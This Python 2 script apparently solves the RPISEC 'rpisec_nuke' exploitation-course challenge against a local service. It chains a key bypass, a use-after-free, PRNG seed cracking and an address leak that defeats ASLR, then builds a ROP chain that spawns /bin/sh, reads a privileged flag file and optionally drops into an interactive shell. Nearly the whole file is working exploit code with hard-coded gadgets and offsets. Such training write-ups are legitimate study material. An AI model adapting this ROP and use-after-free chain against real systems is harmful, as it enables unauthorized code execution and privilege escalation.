#!/usr/bin/python
# coding: utf-8

# nuk3m.py - solution to rpisec_nuke by Ivan 'evilgroot' Luengo
# Writeup at https://github.com/evilgroot/mbe-solutions/blob/master/project2/README.md

import ctypes
import socket
import struct
import sys
import time

##################
#  Global stuff  #
##################

s = None  # Socked used to communicate with the remote service
# These values may depend on your setup
vmlibcpath = '/lib/i386-linux-gnu/libc.so.6'  # Path to glibc library
disarmoff = 0x4021  # disarm_nuke()'s offset
binshoff = 0x160a24  # "/bin/sh" offset from libc base
libcoff = 0x1e6021  # libc base from disarm_nuke()
# ROP GADGETS
gadget1 = 0x00002cd4  # mov esp, edx ; ret
gadget2 = 0x000f9151  # pop edx ; pop ecx ; pop ebx ; ret (libc)
gadget3 = 0x0002469f  # pop eax ; ret (libc)
gadget4 = 0x00001682  # int 0x80

###############
#  Functions  #
###############


def sr(verb, *buf):
    '''
    Crappy function to send/receive data
    '''
    global s
    r = []
    for x in buf:
        s.sendall(x)
        time.sleep(0.01)
        ret = ''
        while True:
            try:
                out = s.recv(1)
                ret += out
                if verb:
                    sys.stdout.write(out)
                    sys.stdout.flush()
            except socket.timeout:
                break
        r.append(ret)
    return r


def interactive(prompt='>>> '):
    '''
    Interactive shell session
    '''
    try:
        while True:
            sr(True, raw_input(prompt)+'\n')
    except KeyboardInterrupt:
        sr('\x03')  # Escape for Ctrl-C


def get_uchallenge(c):
    '''
    Converts the challenge string into an unsigned integer list.
    '''
    ret = []
    s = ''.join(c.split('.'))  # Get rid of the dots
    for i in xrange(len(s)/8):
        num = int(s[8*i:(8*i)+8], 16)
        # Flip endianess
        ret.append(struct.unpack('<I', struct.pack('>I', num))[0])
    return ret


def crack_prng_seed(t, c, s, off=10):
    '''
    This function will crack the PseudoRandom Number Generator seed.
    '''
    seed = None
    libc = ctypes.CDLL(vmlibcpath)
    for x in xrange(off):
        # Reset the current state
        libc.srand(ctypes.c_uint32(t-x).value)
        # Check against the challenge
        for i in xrange(4):  # We only care about the first four bytes
            if c[i] ^ libc.rand() != s[i]:
                break
        else:
            seed = ctypes.c_uint32(t-x).value
            break
    return seed


def reverse_key2(s, c):
    '''
    This function will reverse the challenge from keythree_auth()
    '''
    libc = ctypes.CDLL(vmlibcpath)
    libc.srand(ctypes.c_uint32(s).value)
    for x in xrange(12):
        libc.rand()  # Prepare rand() to return the right values
    # Get the challenge in a valid format
    chall = get_uchallenge(c)
    res = []
    for i in xrange(len(chall)):
        n = ctypes.c_uint32(chall[i] ^ libc.rand()).value
        res.extend(((n >> x) & 0xff) for x in xrange(0, 25, 8))
    plain = '.'.join(map(lambda x: ('%02x' % x).upper(), res))
    return plain

#################
#  ANSI colors  #
#################


class colors:
    '''
    Class used to handle ANSI escapes
    '''
    RED = '\033[91m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[94m'
    CYAN = '\033[36m'
    MAGENTA = '\033[95m'
    WHITE = '\033[97m'
    GREY = '\033[90m'
    BLACK = '\033[30m'
    RESET = '\033[0m'

###########################
#  Nuke86 code generator  #
###########################


class Nuke86(object):
    '''
    This class generates useful code to program and exploit nuke86
    '''
    __slots__ = ['checksum', 'maxsize']

    maxsize = 0x1f8  # Max bytes of code

    def __init__(self, checksum):
        self.checksum = checksum

    def validate(self, code):
        '''
        Makes sure the code is properly checksummed
        '''
        final = code
        cksum = 0
        # Makes sure the size is multiple of 4
        if len(final) % 4 != 0:
            final += '\x00'*(4 - (len(final) % 4))
        # Verifies the length of the code
        if len(final) > self.maxsize:
            final = final[:self.maxsize]
        # Checksums the code
        for x in struct.unpack('<'+'I'*(len(final) / 4), final):
            cksum ^= x
        cksum ^= 0x444e4500
        if cksum != self.checksum:
            final += struct.pack('<I', cksum ^ self.checksum)
        return final

    def detonate(self, target):
        '''
        Generates the code to detonate the nuke on a target
        '''
        if 4 + (2 * len(target)) > self.maxsize:
            raise ValueError('Target name is too long')

        code = ''.join(['S%sI' % x for x in target])
        code += 'DOOM'
        return self.validate(code).encode('hex')

    def leak(self, off, n=4, repro=True):
        '''
        Leaks +n+ bytes from offset +off+ from the target buffer.
        If repro is True, a reprogramming will be requested after the leaking.
        '''
        if ((repro and off + (2*n) - 1 > self.maxsize) or
           (not repro and off + (2*n) > self.maxsize)):
            raise ValueError('Offset too long')

        code = 'I'*off + 'I'.join([x for x in ('O'*n)])
        if repro:
            code += 'R'
        return self.validate(code).encode('hex')

    def pwn(self, pivot, ropchain):
        '''
        Generates the code to execute a ROP chain, a stack pivoting gadget is
        required.
        '''
        # Prepare the ROP chain
        code = ''.join(['S%sI' % x for x in ropchain])
        # Place the pivoting gadget
        code += 'I'*(0x84-len(ropchain))
        code += ''.join(['S%sI' % x for x in struct.pack('<I', pivot)])
        code += 'DOOM'  # Trigger the call to the pivot gadget
        return self.validate(code).encode('hex')


if __name__ == '__main__':
    verb = False
    HOST, PORT = ('localhost', 31337)
    if len(sys.argv[1:]) > 0:
        # Enable rpisec_nuke output, I used this for debugging
        if sys.argv[1] in ['-v', '--verbose']:
            verb = True

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    print '[%s+%s] Connecting to remote service @ %s%s%s:%s%d%s' % \
          (colors.BLUE, colors.RESET, colors.YELLOW, HOST, colors.RESET,
           colors.YELLOW, PORT, colors.RESET)

    try:
        s.connect((HOST, PORT))
        print '[%s*%s] Connected with %ssuccess%s' % \
              (colors.GREEN, colors.RESET, colors.GREEN, colors.RESET)
        s.settimeout(2)  # Drop timeout

        # Save approximate initial time
        init_time = int(time.time())

        # ******  STAGE 1  ******
        print '\n[%s+%s] Stage 1: Bypass G. Hotz\'s key' % \
              (colors.BLUE, colors.RESET)
        out = sr(verb, '1\n', '\x00\n', '\n')
        if out[1].find('KEY AUTHENTICATED') < 0:
            raise RuntimeError('G. Hotz\'s key couldn\'t be bypassed')
        n = out[0].find('LAUNCH SESSION')  # Save launch session for later
        if n < 0:
            raise RuntimeError('Couldn\'t retreive session number')
        session = int(out[0][n+31:n+41])
        print '[%s*%s] G. Hotz\'s key %sbypassed%s!' % \
              (colors.GREEN, colors.RESET, colors.GREEN, colors.RESET)

        # ****** STAGE 2 ******
        print '\n[%s+%s] Stage 2: Prepare use-after-free exploit' % \
              (colors.BLUE, colors.RESET)
        print '[%s+%s] Preparing dangling pointer...' % \
              (colors.BLUE, colors.RESET)
        sr(verb, '3\n', '\n', '\n')  # Mangling pointer created
        print '[%s*%s] Dangling pointer ready!' % (colors.GREEN, colors.RESET)
        print '[%s+%s] Forging structure to crack the keys...' % \
              (colors.BLUE, colors.RESET)
        sr(verb, '2\n', '\n', '32\n', '\x00'*16 +
           '\x20\x0d\x6a\xb9\xc0\xa8\xc9\xb3\x99\xa0\xed\x72\xac\x8b' +
           '\x46\x7c', '\n')
        print '[%s*%s] Structure ready!' % (colors.GREEN, colors.RESET)

        # ****** STAGE 3 ******
        print '\n[%s+%s] Stage 3: Bypass G. Doom\'s key' % \
              (colors.BLUE, colors.RESET)
        out = sr(verb, '3\n', '\n', '\n')
        print '[%s*%s] G. Doom\'s key %sbypassed%s!' % \
              (colors.GREEN, colors.RESET, colors.GREEN, colors.RESET)

        # ****** STAGE 4 ******
        print '\n[%s+%s] Stage 4: Bypass G. Crowell\'s key' % \
              (colors.BLUE, colors.RESET)
        # Read leaked info
        n = out[0].find('CHALLENGE (64 Bytes):')
        if n < 0:
            raise RuntimeError('Couldn\'t read challenge')
        chall = out[0][n+59:n+106]
        xkey2 = out[0][n+293:n+340]
        print '[%s+%s] Challenge: %s%s%s' % \
              (colors.BLUE, colors.RESET, colors.YELLOW, chall, colors.RESET)
        print '[%s+%s] xor\'ed key: %s%s%s' % \
              (colors.BLUE, colors.RESET, colors.YELLOW, xkey2, colors.RESET)
        print '[%s+%s] Bruteforcing key...' % (colors.BLUE, colors.RESET)
        seed = crack_prng_seed(session+init_time, get_uchallenge(chall),
                               [0, 0, 0, 0])
        if seed is None:
            raise RuntimeError('The seed couldn\'t be bruteforced')
        print '[%s*%s] Seed: %s%d%s' % \
              (colors.GREEN, colors.RESET, colors.GREEN, seed, colors.RESET)
        key2 = reverse_key2(seed, xkey2)
        print '[%s+%s] G. Crowell\'s key: %s%s%s' % \
              (colors.BLUE, colors.RESET, colors.YELLOW, key2, colors.RESET)
        print '[%s+%s] Authenticating...' % (colors.BLUE, colors.RESET)
        key2 = ''.join(key2.split('.'))
        sr(verb, '2\n', key2+'\n', '16\n', 'KING CROWELL\x00', '\n')
        print '[%s*%s] Key 2 %sauthenticated%s!' % \
              (colors.GREEN, colors.RESET, colors.GREEN, colors.RESET)

        # ******  ALL KEYS INTRODUCED  ******
        print '\n[%s*%s] %sALL KEYS INTRODUCED%s' % \
              (colors.GREEN, colors.RESET, colors.GREEN, colors.RESET)

        # ****** STAGE 5 ******
        print '\n[%s+%s] Stage 5: Compute base addresses' % \
              (colors.BLUE, colors.RESET)
        print '[%s+%s] Initializing nuke86 wrapper...' % \
              (colors.BLUE, colors.RESET)
        nuke86 = Nuke86(0xCAC380CD ^ 0xBADC0DED ^ 0xACC3D489)
        print '[%s*%s] Nuke86 wrapper ready!' % (colors.GREEN, colors.RESET)

        print '[%s+%s] Leaking disarm_nuke() address...' % \
              (colors.BLUE, colors.RESET)
        sr(verb, '4\n', nuke86.leak(0x80, 4)+'\n', '\n')
        out = sr(verb, 'confirm\n')
        n = out[0].find('0x')
        if n < 0:
            raise RuntimeError('Cannot leak disarm_nuke() address')
        disarm = int(out[0][n+227:n+229]+out[0][n+152:n+154]+out[0][n+77:n+79]
                     + out[0][n+2:n+4], 16)
        elfbase = disarm - disarmoff
        libcbase = disarm - libcoff
        print '[%s*%s] disarm_nuke() @ %s0x%08x%s' % \
              (colors.GREEN, colors.RESET, colors.YELLOW, disarm, colors.RESET)
        print '[%s*%s] elf base @ %s0x%08x%s' % \
              (colors.GREEN, colors.RESET, colors.YELLOW, elfbase, colors.RESET)
        print '[%s*%s] libc base @ %s0x%08x%s' % \
              (colors.GREEN, colors.RESET, colors.YELLOW, libcbase, colors.RESET)

        # ****** STAGE 6 ******
        print '\n[%s+%s] Stage 6: Overwrite detonate_nuke() address' % \
              (colors.BLUE, colors.RESET)
        print '[%s+%s] Computing gadget addresses...' % \
              (colors.BLUE, colors.RESET)

        pivot = elfbase + gadget1
        g1 = libcbase + gadget2
        g2 = libcbase + gadget3
        g3 = elfbase + gadget4
        binsh = libcbase + binshoff

        print '\t[%sPIVOT%s] mov esp, edx ; ret @ %s0x%08x%s' % \
              (colors.CYAN, colors.RESET, colors.YELLOW, pivot, colors.RESET)
        print '\t[%sGADGET 1%s] pop edx ; pop ecx ; pop ebx ; ret @ %s0x%08x%s' \
              % (colors.GREEN, colors.RESET, colors.YELLOW, g1, colors.RESET)
        print '\t[%sGADGET 2%s] pop eax ; ret @ %s0x%08x%s' % \
              (colors.GREEN, colors.RESET, colors.YELLOW, g2, colors.RESET)
        print '\t[%sGADGET 3%s] int 0x80 @ %s0x%08x%s' % \
              (colors.GREEN, colors.RESET, colors.YELLOW, g3, colors.RESET)
        print '\t[%s/bin/sh%s] "/bin/sh" @ %s0x%08x%s' % \
              (colors.GREEN, colors.RESET, colors.YELLOW, binsh, colors.RESET)

        # Build the ROP chain
        chain = struct.pack('<IIII', g1, 0, 0, binsh)
        chain += struct.pack('<II', g2, 0xb)
        chain += struct.pack('<I', g3)

        print '[%s+%s] Reprogramming...' % (colors.BLUE, colors.RESET)
        sr(verb, nuke86.pwn(pivot, chain)+'\n')

        flag = sr(False, 'cat /home/project2_priv/.pass\n')[0]
        if not flag:
            raise RuntimeError('The flag could not be read')

        print '[%sSUCCESS%s] flag : %s%s%s' % \
              (colors.GREEN, colors.RESET, colors.YELLOW, flag, colors.RESET)

        if '-s' in sys.argv[1:]:
            print '\n[%s+%s] Entering in interactive shell mode' % \
                  (colors.BLUE, colors.RESET)
            s.settimeout(0.2)
            interactive('$ ')

    except KeyboardInterrupt:
        print '[+] %sCtrl-C requested, aborting...%s' % (colors.YELLOW,
                                                         colors.RESET)
    except RuntimeError as e:
        print '[%s!%s] %s%s%s' (colors.RED, colors.RESET, colors.RED, e,
                                colors.RESET)
    except socket.error as e:
        print '[%s!%s] Communication error: %s%s%s' % \
              (colors.RED, colors.RESET, colors.RED, e, colors.RESET)
    finally:
        s.close()
